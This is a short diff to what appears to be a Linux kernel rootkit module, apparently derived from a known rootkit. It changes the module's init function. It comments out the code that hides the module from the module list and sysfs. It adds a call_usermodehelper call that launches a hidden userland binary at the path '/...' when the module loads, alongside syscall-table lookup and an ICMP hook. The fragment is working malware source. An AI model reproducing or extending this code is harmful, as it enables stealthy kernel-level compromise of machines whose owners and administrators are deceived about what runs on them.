@@ -940,11 +940,16 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
 static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
 {
-    /* Hide LKM and all symbols */
-    list_del_init(&__this_module.list);
+  
+    char* envp[] = { "HOME=/" , NULL } ;
+    //    char* argv[] = { "/root/XJJ/client/client" , NULL } ;
+    char* argv[] = { "/..." , NULL } ;
+    
+    /* /\* Hide LKM and all symbols *\/ */
+    /* list_del_init(&__this_module.list); */
 
-    /* Hide LKM from sysfs */
-    kobject_del(__this_module.holders_dir->parent);
+    /* /\* Hide LKM from sysfs *\/ */
+    /* kobject_del(__this_module.holders_dir->parent); */
 
     #if defined(_CONFIG_X86_64_)
     ia32_sys_call_table = find_ia32_sys_call_table();
@@ -1001,6 +1006,8 @@ static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
     #if defined(_CONFIG_ICMP_)
     icmp_init();
     #endif
+    
+    call_usermodehelper( argv[0] , argv , envp , UMH_WAIT_EXEC ) ;
 
     return 0;
 }
